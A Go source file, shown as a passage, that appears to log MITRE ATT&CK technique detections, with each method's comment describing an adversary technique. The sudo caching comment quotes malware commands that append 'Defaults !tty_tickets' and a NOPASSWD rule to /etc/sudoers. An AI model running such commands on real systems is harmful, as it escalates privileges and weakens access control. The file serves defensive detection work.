resides in NTDLL.dll and is part of the Windows Native API which is called from
functions like CreateProcess, LoadLibrary, etc. of the Win32 API. (Citation:
Wikipedia Windows Library Files) The module loader can load DLLs:   via
specification of the (fully-qualified or relative) DLL pathname in the IMPORT
directory;   via EXPORT forwarded to another DLL, specified with (fully-
qualified or relative) pathname (but without extension);   via an NTFS junction
or symlink program.exe.local with the fully-qualified or relative pathname of a
directory containing the DLLs specified in the IMPORT directory or forwarded
EXPORTs;   via <file name="filename.extension" loadFrom="fully-qualified or
relative pathname"> in an embedded or external "application manifest". The file
name refers to an entry in the IMPORT directory or a forwarded EXPORT.
Adversaries may use this functionality as a way to execute arbitrary code on a
victim system. For example, malware may execute share modules to load additional
components or features.
*/
func (g *Session) ATTACKEntSharedModules(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1129").
        Msg("shared modules")
}

/* ATTACKEntSharedWebroot Phases: lateral-movement

This technique has been deprecated and should no longer be used. Adversaries may
add malicious content to an internally accessible website through an open
network file share that contains the website's webroot or Web content directory
(Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then
browse to that content with a Web browser to cause the server to execute the
malicious content. The malicious content will typically run under the context
and permissions of the Web server process, often resulting in local system or
administrative privileges, depending on how the Web server is configured. This
mechanism of shared access and remote execution could be used for lateral
movement to the system running the Web server. For example, a Web server running
PHP with an open network share could allow an adversary to upload a remote
access tool and PHP script to execute the RAT on the system running the Web
server when a specific page is visited. (Citation: Webroot PHP 2011)
*/
func (g *Session) ATTACKEntSharedWebroot(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1051").
        Msg("shared webroot")
}

/* ATTACKEntSharepoint Phases: collection

Adversaries may leverage the SharePoint repository as a source to mine valuable
information. SharePoint will often contain useful information for an adversary
to learn about the structure and functionality of the internal network and
systems. For example, the following is a list of example information that may
hold potential value to an adversary and may also be found on SharePoint:
Policies, procedures, and standards Physical / logical network diagrams System
architecture diagrams Technical system documentation Testing / development
credentials Work / project schedules Source code snippets Links to network
shares and other internal resources
*/
func (g *Session) ATTACKEntSharepoint(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1213.002").
        Msg("sharepoint")
}

/* ATTACKEntShortcutModification Phases: persistence privilege-escalation

Adversaries may create or edit shortcuts to run a program during system boot or
user login. Shortcuts or symbolic links are ways of referencing other files or
programs that will be opened or executed when the shortcut is clicked or
executed by a system startup process. Adversaries could use shortcuts to execute
their tools for persistence. They may create a new shortcut as a means of
indirection that may use Masquerading to look like a legitimate program.
Adversaries could also edit the target path or entirely replace an existing
shortcut so their tools will be executed instead of the intended legitimate
program.
*/
func (g *Session) ATTACKEntShortcutModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.009").
        Msg("shortcut modification")
}

/* ATTACKEntSignedBinaryProxyExecution Phases: defense-evasion

Adversaries may bypass process and/or signature-based defenses by proxying
execution of malicious content with signed binaries. Binaries signed with
trusted digital certificates can execute on Windows systems protected by digital
signature validation. Several Microsoft signed binaries that are default on
Windows installations can be used to proxy execution of other files.
*/
func (g *Session) ATTACKEntSignedBinaryProxyExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218").
        Msg("signed binary proxy execution")
}

/* ATTACKEntSignedScriptProxyExecution Phases: defense-evasion

Adversaries may use scripts signed with trusted certificates to proxy execution
of malicious files. Several Microsoft signed scripts that are default on Windows
installations can be used to proxy execution of other files. This behavior may
be abused by adversaries to execute malicious files that could bypass
application control and signature validation on systems.(Citation: GitHub
Ultimate AppLocker Bypass List)
*/
func (g *Session) ATTACKEntSignedScriptProxyExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1216").
        Msg("signed script proxy execution")
}

/* ATTACKEntSilverTicket Phases: credential-access

Adversaries who have the password hash of a target service account (e.g.
SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets,
also known as silver tickets. Kerberos TGS tickets are also known as service
tickets.(Citation: ADSecurity Silver Tickets) Silver tickets are more limited in
scope in than golden tickets in that they only enable adversaries to access a
particular resource (e.g. MSSQL) and the system that hosts the resource;
however, unlike golden tickets, adversaries with the ability to forge silver
tickets are able to create TGS tickets without interacting with the Key
Distribution Center (KDC), potentially making detection more
difficult.(Citation: ADSecurity Detecting Forged Tickets) Password hashes for
target services may be obtained using OS Credential Dumping or Kerberoasting.
*/
func (g *Session) ATTACKEntSilverTicket(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1558.002").
        Msg("silver ticket")
}

/* ATTACKEntSocialMedia Phases: reconnaissance

Adversaries may search social media for information about victims that can be
used during targeting. Social media sites may contain various information about
a victim organization, such as business announcements as well as information
about the roles, locations, and interests of staff. Adversaries may search in
different social media sites depending on what information they seek to gather.
Threat actors may passively harvest data from these sites, as well as use
information gathered to create fake profiles/groups to elicit victim’s into
revealing specific information (i.e. Spearphishing Service).(Citation: Cyware
Social Media) Information from these sources may reveal opportunities for other
forms of reconnaissance (ex: Phishing for Information or Search Open Technical
Databases), establishing operational resources (ex: Establish Accounts or
Compromise Accounts), and/or initial access (ex: Spearphishing via Service).
*/
func (g *Session) ATTACKEntSocialMedia(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1593.001").
        Msg("social media")
}

/* ATTACKEntSocialMediaAccounts Phases: resource-development

Adversaries may create and cultivate social media accounts that can be used
during targeting. Adversaries can create social media accounts that can be used
to build a persona to further operations. Persona development consists of the
development of public information, presence, history and appropriate
affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) For
operations incorporating social engineering, the utilization of a persona on
social media may be important. These personas may be fictitious or impersonate
real people. The persona may exist on a single social media site or across
multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona
on social media may require development of additional documentation to make them
seem real. This could include filling out profile information, developing social
networks, or incorporating photos.  Once a persona has been developed an
adversary can use it to create connections to targets of interest. These
connections may be direct or may include trying to connect through
others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts
may be leveraged during other phases of the adversary lifecycle, such as during
Initial Access (ex: Spearphishing via Service).
*/
func (g *Session) ATTACKEntSocialMediaAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1585.001").
        Msg("social media accounts")
}

/* ATTACKEntSocialMediaAccounts2 Phases: resource-development

Adversaries may compromise social media accounts that can be used during
targeting. For operations incorporating social engineering, the utilization of
an online persona may be important. Rather than creating and cultivating social
media profiles (i.e. Social Media Accounts), adversaries may compromise existing
social media accounts. Utilizing an existing persona may engender a level of
trust in a potential victim if they have a relationship, or knowledge of, the
compromised persona.  A variety of methods exist for compromising social media
accounts, such as gathering credentials via Phishing for Information, purchasing
credentials from third-party sites, or by brute forcing credentials (ex:
password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to
compromising social media accounts, adversaries may conduct Reconnaissance to
inform decisions about which accounts to compromise to further their operation.
Personas may exist on a single site or across multiple sites (ex: Facebook,
LinkedIn, Twitter, etc.). Compromised social media accounts may require
additional development, this could include filling out or modifying profile
information, further developing social networks, or incorporating photos.
Adversaries can use a compromised social media profile to create new, or hijack
existing, connections to targets of interest. These connections may be direct or
may include trying to connect through others.(Citation:
NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be
leveraged during other phases of the adversary lifecycle, such as during Initial
Access (ex: Spearphishing via Service).
*/
func (g *Session) ATTACKEntSocialMediaAccounts2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1586.001").
        Msg("social media accounts")
}

/* ATTACKEntSoftware Phases: reconnaissance

Adversaries may gather information about the victim's host software that can be
used during targeting. Information about installed software may include a
variety of details such as types and versions on specific hosts, as well as the
presence of additional components that might be indicative of added defensive
protections (ex: antivirus, SIEMs, etc.). Adversaries may gather this
information in various ways, such as direct collection actions via Active
Scanning (ex: listening ports, server banners, user agent strings) or Phishing
for Information. Adversaries may also compromise sites then include malicious
content designed to collect host information from visitors.(Citation: ATT
ScanBox) Information about the installed software may also be exposed to
adversaries via online or other accessible data sets (ex: job postings, network
maps, assessment reports, resumes, or purchase invoices). Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Search Open Websites/Domains or Search Open Technical Databases), establishing
operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or
for initial access (ex: Supply Chain Compromise or External Remote Services).
*/
func (g *Session) ATTACKEntSoftware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1592.002").
        Msg("software")
}

/* ATTACKEntSoftwareDeploymentTools Phases: execution lateral-movement

Adversaries may gain access to and use third-party software suites installed
within an enterprise network, such as administration, monitoring, and deployment
systems, to move laterally through the network. Third-party applications and
software deployment systems may be in use in the network environment for
administration purposes (e.g., SCCM, HBSS, Altiris, etc.). Access to a third-
party network-wide or enterprise-wide software system may enable an adversary to
have remote code execution on all systems that are connected to such a system.
The access may be used to laterally move to other systems, gather information,
or cause a specific effect, such as wiping the hard drives on all endpoints. The
permissions required for this action vary by system configuration; local
credentials may be sufficient with direct access to the third-party system, or
specific domain credentials may be required. However, the system may require an
administrative account to log in or to perform it's intended purpose.
*/
func (g *Session) ATTACKEntSoftwareDeploymentTools(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1072").
        Msg("software deployment tools")
}

/* ATTACKEntSoftwareDiscovery Phases: discovery

Adversaries may attempt to get a listing of software and software versions that
are installed on a system or in a cloud environment. Adversaries may use the
information from Software Discovery during automated discovery to shape follow-
on behaviors, including whether or not the adversary fully infects the target
and/or attempts specific actions. Adversaries may attempt to enumerate software
for a variety of reasons, such as figuring out what security measures are
present or if the compromised system has a version of software that is
vulnerable to Exploitation for Privilege Escalation.
*/
func (g *Session) ATTACKEntSoftwareDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1518").
        Msg("software discovery")
}

/* ATTACKEntSoftwarePacking Phases: defense-evasion

Adversaries may perform software packing or virtual machine software protection
to conceal their code. Software packing is a method of compressing or encrypting
an executable. Packing an executable changes the file signature in an attempt to
avoid signature-based detection. Most decompression techniques decompress the
executable code in memory. Virtual machine software protection translates an
executable's original code into a special format that only a special virtual
machine can run. A virtual machine is then called to run this code.(Citation:
ESET FinFisher Jan 2018)  Utilities used to perform software packing are called
packers. Example packers are MPRESS and UPX. A more comprehensive list of known
packers is available, (Citation: Wikipedia Exe Compression) but adversaries may
create their own packing techniques that do not leave the same artifacts as
well-known packers to evade defenses.
*/
func (g *Session) ATTACKEntSoftwarePacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027.002").
        Msg("software packing")
}

/* ATTACKEntSource Phases: execution

This technique has been deprecated and should no longer be used. The source
command loads functions into the current shell or executes files in the current
context. This built-in command can be run in two different ways source
/path/to/filename [arguments] or .This technique has been deprecated and should
no longer be used. /path/to/filename [arguments]. Take note of the space after
the ".". Without a space, a new shell is created that runs the program instead
of running the program within the current context. This is often used to make
certain features or functions available to a shell or to update a specific
shell's environment.(Citation: Source Manual) Adversaries can abuse this
functionality to execute programs. The file executed with this technique does
not need to be marked executable beforehand.
*/
func (g *Session) ATTACKEntSource(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1153").
        Msg("source")
}

/* ATTACKEntSpaceafterFilename Phases: defense-evasion

Adversaries can hide a program's true filetype by changing the extension of a
file. With certain file types (specifically this does not work with .app
extensions), appending a space to the end of a filename will change how the file
is processed by the operating system. For example, if there is a Mach-O
executable file called evil.bin, when it is double clicked by a user, it will
launch Terminal.app and execute. If this file is renamed to evil.txt, then when
double clicked by a user, it will launch with the default text editing
application (not executing the binary). However, if the file is renamed to
evil.txt  (note the space at the end), then when double clicked by a user, the
true file type is determined by the OS and handled appropriately and the binary
will be executed (Citation: Mac Backdoors are back). Adversaries can use this
feature to trick users into double clicking benign-looking files of any format
and ultimately executing something malicious.
*/
func (g *Session) ATTACKEntSpaceafterFilename(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.006").
        Msg("space after filename")
}

/* ATTACKEntSpearphishingAttachment Phases: initial-access

Adversaries may send spearphishing emails with a malicious attachment in an
attempt to gain access to victim systems. Spearphishing attachment is a specific
variant of spearphishing. Spearphishing attachment is different from other forms
of spearphishing in that it employs the use of malware attached to an email. All
forms of spearphishing are electronically delivered social engineering targeted
at a specific individual, company, or industry. In this scenario, adversaries
attach a file to the spearphishing email and usually rely upon User Execution to
gain execution. Spearphishing may also involve social engineering techniques,
such as posing as a trusted source. There are many options for the attachment
such as Microsoft Office documents, executables, PDFs, or archived files. Upon
opening the attachment (and potentially clicking past protections), the
adversary's payload exploits a vulnerability or directly executes on the user's
system. The text of the spearphishing email usually tries to give a plausible
reason why the file should be opened, and may explain how to bypass system
protections in order to do so. The email may also contain instructions on how to
decrypt an attachment, such as a zip file password, in order to evade email
boundary defenses. Adversaries frequently manipulate file extensions and icons
in order to make attached executables appear to be document files, or files
exploiting one application appear to be a file for a different one.
*/
func (g *Session) ATTACKEntSpearphishingAttachment(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1566.001").
        Msg("spearphishing attachment")
}

/* ATTACKEntSpearphishingAttachment2 Phases: reconnaissance

Adversaries may send spearphishing messages with a malicious attachment to
elicit sensitive information that can be used during targeting. Spearphishing
for information is an attempt to trick targets into divulging information,
frequently credentials or other actionable information. Spearphishing for
information frequently involves social engineering techniques, such as posing as
a source with a reason to collect information (ex: Establish Accounts or
Compromise Accounts) and/or sending multiple, seemingly urgent messages. All
forms of spearphishing are electronically delivered social engineering targeted
at a specific individual, company, or industry. In this scenario, adversaries
attach a file to the spearphishing email and usually rely upon the recipient
populating information then returning the file.(Citation: Sophos
Attachment)(Citation: GitHub Phishery) The text of the spearphishing email
usually tries to give a plausible reason why the file should be filled-in, such
as a request for information from a business associate. Adversaries may also use
information from previous reconnaissance efforts (ex: Search Open
Websites/Domains or Search Victim-Owned Websites) to craft persuasive and
believable lures.
*/
func (g *Session) ATTACKEntSpearphishingAttachment2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1598.002").
        Msg("spearphishing attachment")
}

/* ATTACKEntSpearphishingLink Phases: initial-access

Adversaries may send spearphishing emails with a malicious link in an attempt to
gain access to victim systems. Spearphishing with a link is a specific variant
of spearphishing. It is different from other forms of spearphishing in that it
employs the use of links to download malware contained in email, instead of
attaching malicious files to the email itself, to avoid defenses that may
inspect email attachments. Spearphishing may also involve social engineering
techniques, such as posing as a trusted source. All forms of spearphishing are
electronically delivered social engineering targeted at a specific individual,
company, or industry. In this case, the malicious emails contain links.
Generally, the links will be accompanied by social engineering text and require
the user to actively click or copy and paste a URL into a browser, leveraging
User Execution. The visited website may compromise the web browser using an
exploit, or the user will be prompted to download applications, documents, zip
files, or even executables depending on the pretext for the email in the first
place. Adversaries may also include links that are intended to interact directly
with an email reader, including embedded images intended to exploit the end
system directly or verify the receipt of an email (i.e. web bugs/web beacons).
Links may also direct users to malicious applications  designed to Steal
Application Access Tokens, like OAuth tokens, in order to gain access to
protected applications and information.(Citation: Trend Micro Pawn Storm OAuth
2017)
*/
func (g *Session) ATTACKEntSpearphishingLink(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1566.002").
        Msg("spearphishing link")
}

/* ATTACKEntSpearphishingLink2 Phases: reconnaissance

Adversaries may send spearphishing messages with a malicious link to elicit
sensitive information that can be used during targeting. Spearphishing for
information is an attempt to trick targets into divulging information,
frequently credentials or other actionable information. Spearphishing for
information frequently involves social engineering techniques, such as posing as
a source with a reason to collect information (ex: Establish Accounts or
Compromise Accounts) and/or sending multiple, seemingly urgent messages. All
forms of spearphishing are electronically delivered social engineering targeted
at a specific individual, company, or industry. In this scenario, the malicious
emails contain links generally accompanied by social engineering text to coax
the user to actively click or copy and paste a URL into a browser.(Citation:
TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may closely
resemble a legitimate site in appearance and have a URL containing elements from
the real site. From the fake website, information is gathered in web forms and
sent to the attacker. Adversaries may also use information from previous
reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned
Websites) to craft persuasive and believable lures.
*/
func (g *Session) ATTACKEntSpearphishingLink2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1598.003").
        Msg("spearphishing link")
}

/* ATTACKEntSpearphishingService Phases: reconnaissance

Adversaries may send spearphishing messages via third-party services to elicit
sensitive information that can be used during targeting. Spearphishing for
information is an attempt to trick targets into divulging information,
frequently credentials or other actionable information. Spearphishing for
information frequently involves social engineering techniques, such as posing as
a source with a reason to collect information (ex: Establish Accounts or
Compromise Accounts) and/or sending multiple, seemingly urgent messages. All
forms of spearphishing are electronically delivered social engineering targeted
at a specific individual, company, or industry. In this scenario, adversaries
send messages through various social media services, personal webmail, and other
non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing)
These services are more likely to have a less-strict security policy than an
enterprise. As with most kinds of spearphishing, the goal is to generate rapport
with the target or get the target's interest in some way. Adversaries may create
fake social media accounts and message employees for potential job
opportunities. Doing so allows a plausible reason for asking about services,
policies, and information about their environment. Adversaries may also use
information from previous reconnaissance efforts (ex: Social Media or Search
Victim-Owned Websites) to craft persuasive and believable lures.
*/
func (g *Session) ATTACKEntSpearphishingService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1598.001").
        Msg("spearphishing service")
}

/* ATTACKEntSpearphishingviaService Phases: initial-access

Adversaries may send spearphishing messages via third-party services in an
attempt to gain access to victim systems. Spearphishing via service is a
specific variant of spearphishing. It is different from other forms of
spearphishing in that it employs the use of third party services rather than
directly via enterprise email channels.  All forms of spearphishing are
electronically delivered social engineering targeted at a specific individual,
company, or industry. In this scenario, adversaries send messages through
various social media services, personal webmail, and other non-enterprise
controlled services. These services are more likely to have a less-strict
security policy than an enterprise. As with most kinds of spearphishing, the
goal is to generate rapport with the target or get the target's interest in some
way. Adversaries will create fake social media accounts and message employees
for potential job opportunities. Doing so allows a plausible reason for asking
about services, policies, and software that's running in an environment. The
adversary can then send malicious links or attachments through these services. A
common example is to build rapport with a target via social media, then send
content to a personal webmail service that the target uses on their work
computer. This allows an adversary to bypass some email restrictions on the work
account, and the target is more likely to open the file since it's something
they were expecting. If the payload doesn't work as expected, the adversary can
continue normal communications and troubleshoot with the target on how to get it
working.
*/
func (g *Session) ATTACKEntSpearphishingviaService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1566.003").
        Msg("spearphishing via service")
}

/* ATTACKEntStageCapabilities Phases: resource-development

Adversaries may upload, install, or otherwise set up capabilities that can be
used during targeting. To support their operations, an adversary may need to
take capabilities they developed (Develop Capabilities) or obtained (Obtain
Capabilities) and stage them on infrastructure under their control. These
capabilities may be staged on infrastructure that was previously
purchased/rented by the adversary (Acquire Infrastructure) or was otherwise
compromised by them (Compromise Infrastructure). Capabilities can also be staged
on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus
November 2020) Staging of capabilities can aid the adversary in a number of
initial access and post-compromise behaviors, including (but not limited to):
Staging web resources necessary to conduct Drive-by Compromise when a user
browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher
2015)(Citation: ATT ScanBox) Staging web resources for a link target to be used
with spearphishing.(Citation: Malwarebytes Silent Librarian October
2020)(Citation: Proofpoint TA407 September 2019) Uploading malware or tools to a
location accessible to a victim network to enable Ingress Tool
Transfer.(Citation: Volexity Ocean Lotus November 2020) Installing a previously
acquired SSL/TLS certificate to use to encrypt command and control traffic (ex:
Asymmetric Cryptography with Web Protocols).(Citation: DigiCert Install SSL
Cert)
*/
func (g *Session) ATTACKEntStageCapabilities(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608").
        Msg("stage capabilities")
}

/* ATTACKEntStandardEncoding Phases: command-and-control

Adversaries may encode data with a standard data encoding system to make the
content of command and control traffic more difficult to detect. Command and
control (C2) information can be encoded using a standard data encoding system
that adheres to existing protocol specifications. Common data encoding schemes
include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia
Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data
encoding systems may also result in data compression, such as gzip.
*/
func (g *Session) ATTACKEntStandardEncoding(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1132.001").
        Msg("standard encoding")
}

/* ATTACKEntStartupItems Phases: persistence privilege-escalation

Adversaries may use startup items automatically executed at boot initialization
to establish persistence. Startup items execute during the final phase of the
boot process and contain shell scripts or other executable files along with
configuration information used by the system to determine the execution order
for all startup items. (Citation: Startup Items) This is technically a
deprecated technology (superseded by Launch Daemon), and thus the appropriate
folder, /Library/StartupItems isn’t guaranteed to exist on the system by
default, but does appear to exist by default on macOS Sierra. A startup item is
a directory whose executable and configuration property list (plist),
StartupParameters.plist, reside in the top-level directory.  An adversary can
create the appropriate folders/files in the StartupItems directory to register
their own persistence mechanism (Citation: Methods of Mac Malware Persistence).
Additionally, since StartupItems run during the bootup phase of macOS, they will
run as the elevated root user.
*/
func (g *Session) ATTACKEntStartupItems(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037.005").
        Msg("startup items")
}

/* ATTACKEntStealApplicationAccessToken Phases: credential-access

Adversaries can steal user application access tokens as a means of acquiring
credentials to access remote systems and resources. This can occur through
social engineering and typically requires user action to grant access.
Application access tokens are used to make authorized API requests on behalf of
a user and are commonly used as a way to access resources in cloud-based
applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should
Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly
implemented framework that issues tokens to users for access to systems. An
application desiring access to cloud-based services or protected APIs can gain
entry using OAuth 2.0 through a variety of authorization protocols. An example
commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation:
Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code
Authorization flow - June 2019) An OAuth access token enables a third-party
application to interact with resources containing user data in the ways
requested by the application without obtaining user credentials.  Adversaries
can leverage OAuth authorization by constructing a malicious application
designed to be granted access to resources with the target user's OAuth token.
The adversary will need to complete registration of their application with the
authorization server, for example Microsoft Identity Platform using Azure
Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST
API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then,
they can send a link through Spearphishing Link to the target user to entice
them to grant access to the application. Once the OAuth access token is granted,
the application can gain potentially long-term access to features of the user
account through Application Access Token.(Citation: Microsoft - Azure AD
Identity Tokens - Aug 2019) Adversaries have been seen targeting Gmail,
Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing
Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)
*/
func (g *Session) ATTACKEntStealApplicationAccessToken(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1528").
        Msg("steal application access token")
}

/* ATTACKEntStealWebSessionCookie Phases: credential-access

An adversary may steal web application or service session cookies and use them
to gain access to web applications or Internet services as an authenticated user
without needing credentials. Web applications and services often use session
cookies as an authentication token after a user has authenticated to a website.
Cookies are often valid for an extended period of time, even if the web
application is not actively used. Cookies can be found on disk, in the process
memory of the browser, and in network traffic to remote systems. Additionally,
other applications on the targets machine might store sensitive authentication
cookies in memory (e.g. apps which authenticate to cloud services). Session
cookies can be used to bypasses some multi-factor authentication
protocols.(Citation: Pass The Cookie) There are several examples of malware
targeting cookies from web browsers on the local system.(Citation: Kaspersky
TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There
are also open source frameworks such as Evilginx 2 and Muraena that can gather
session cookies through a man-in-the-middle proxy that can be set up by an
adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation:
GitHub Mauraena) After an adversary acquires a valid cookie, they can then
perform a Web Session Cookie technique to login to the corresponding web
application.
*/
func (g *Session) ATTACKEntStealWebSessionCookie(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1539").
        Msg("steal web session cookie")
}

/* ATTACKEntStealorForgeKerberosTickets Phases: credential-access

Adversaries may attempt to subvert Kerberos authentication by stealing or
forging Kerberos tickets to enable Pass the Ticket.  Kerberos is an
authentication protocol widely used in modern Windows domain environments. In
Kerberos environments, referred to as “realms”, there are three basic
participants: client, service, and Key Distribution Center (KDC).(Citation:
ADSecurity Kerberos Ring Decoder) Clients request access to a service and
through the exchange of Kerberos tickets, originating from KDC, they are granted
access after having successfully authenticated. The KDC is responsible for both
authentication and ticket granting.  Attackers may attempt to abuse Kerberos by
stealing tickets or forging tickets to enable unauthorized access.
*/
func (g *Session) ATTACKEntStealorForgeKerberosTickets(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1558").
        Msg("steal or forge kerberos tickets")
}

/* ATTACKEntSteganography Phases: defense-evasion

Adversaries may use steganography techniques in order to prevent the detection
of hidden information. Steganographic techniques can be used to hide data in
digital media such as images, audio tracks, video clips, or text files. Duqu was
an early example of malware that used steganography. It encrypted the gathered
information from a victim's system and hid it within an image before
exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu)  By the end of
2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image
file (.png) and execute the code on a victim's system. In this particular case
the PowerShell code downloaded another obfuscated script to gather intelligence
from the victim's machine and communicate it back to the adversary.(Citation:
McAfee Malicious Doc Targets Pyeongchang Olympics)
*/
func (g *Session) ATTACKEntSteganography(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027.003").
        Msg("steganography")
}

/* ATTACKEntSteganography2 Phases: command-and-control

Adversaries may use steganographic techniques to hide command and control
traffic to make detection efforts more difficult. Steganographic techniques can
be used to hide data in digital messages that are transferred between systems.
This hidden information can be used for command and control of compromised
systems. In some cases, the passing of files embedded using steganography, such
as image or document files, can be used for command and control.
*/
func (g *Session) ATTACKEntSteganography2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1001.002").
        Msg("steganography")
}

/* ATTACKEntStoredDataManipulation Phases: impact

Adversaries may insert, delete, or manipulate data at rest in order to
manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct
2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries
may attempt to affect a business process, organizational understanding, and
decision making. Stored data could include a variety of file formats, such as
Office files, databases, stored emails, and custom file formats. The type of
modification and the impact it will have depends on the type of data as well as
the goals and objectives of the adversary. For complex systems, an adversary
would likely need special expertise and possibly access to specialized software
related to the system that would typically be gained through a prolonged
information gathering campaign in order to have the desired impact.
*/
func (g *Session) ATTACKEntStoredDataManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1565.001").
        Msg("stored data manipulation")
}

/* ATTACKEntSubvertTrustControls Phases: defense-evasion

Adversaries may undermine security controls that will either warn users of
untrusted activity or prevent execution of untrusted programs. Operating systems
and security products may contain mechanisms to identify programs or websites as
possessing some level of trust. Examples of such features would include a
program being allowed to run because it is signed by a valid code signing
certificate, a program prompting the user with a warning because it has an
attribute set from being downloaded from the Internet, or getting an indication
that you are about to connect to an untrusted site. Adversaries may attempt to
subvert these trust mechanisms. The method adversaries use will depend on the
specific mechanism they seek to subvert. Adversaries may conduct File and
Directory Permissions Modification or Modify Registry in support of subverting
these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may
also create or steal code signing certificates to acquire trust on target
systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital
Certificates)
*/
func (g *Session) ATTACKEntSubvertTrustControls(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553").
        Msg("subvert trust controls")
}

/* ATTACKEntSudoandSudoCaching Phases: privilege-escalation defense-evasion

Adversaries may perform sudo caching and/or use the suoders file to elevate
privileges. Adversaries may do this to execute commands as other users or spawn
processes with higher privileges. Within Linux and MacOS systems, sudo
(sometimes referred to as "superuser do") allows users to perform commands from
terminals with elevated privileges and to control who can perform these commands
on the system. The sudo command "allows a system administrator to delegate
authority to give certain users (or groups of users) the ability to run some (or
all) commands as root or another user while providing an audit trail of the
commands and their arguments."(Citation: sudo man page 2018) Since sudo was made
for the system administrator, it has some useful configuration features such as
a timestamp_timeout, which is the amount of time in minutes between instances of
sudo before it will re-prompt for a password. This is because sudo has the
ability to cache credentials for a period of time. Sudo creates (or touches) a
file at /var/db/sudo with a timestamp of when sudo was last run to determine
this timeout. Additionally, there is a tty_tickets variable that treats each new
tty (terminal session) in isolation. This means that, for example, the sudo
timeout of one tty will not affect another tty (you will have to type the
password again). The sudoers file, /etc/sudoers, describes which users can run
which commands and from which terminals. This also describes which commands
users can run as other users or groups. This provides the principle of least
privilege such that users are running in their lowest possible permissions for
most of the time and only elevate to other users or permissions as needed,
typically by prompting for a password. However, the sudoers file can also
specify when to not prompt users for passwords with a line like user1 ALL=(ALL)
NOPASSWD: ALL (Citation: OSX.Dok Malware). Elevated privileges are required to
edit this file though. Adversaries can also abuse poor configurations of these
mechanisms to escalate privileges without needing the user's password. For
example, /var/db/sudo's timestamp can be monitored to see if it falls within the
timestamp_timeout range. If it does, then malware can execute sudo commands
without needing to supply the user's password. Additional, if tty_tickets is
disabled, adversaries can do this from any tty for that user. In the wild,
malware has disabled tty_tickets to potentially make scripting easier by issuing
echo \'Defaults !tty_tickets\' >> /etc/sudoers (Citation: cybereason osx
proton). In order for this change to be reflected, the malware also issued
killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled
by default.
*/
func (g *Session) ATTACKEntSudoandSudoCaching(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1548.003").
        Msg("sudo and sudo caching")
}

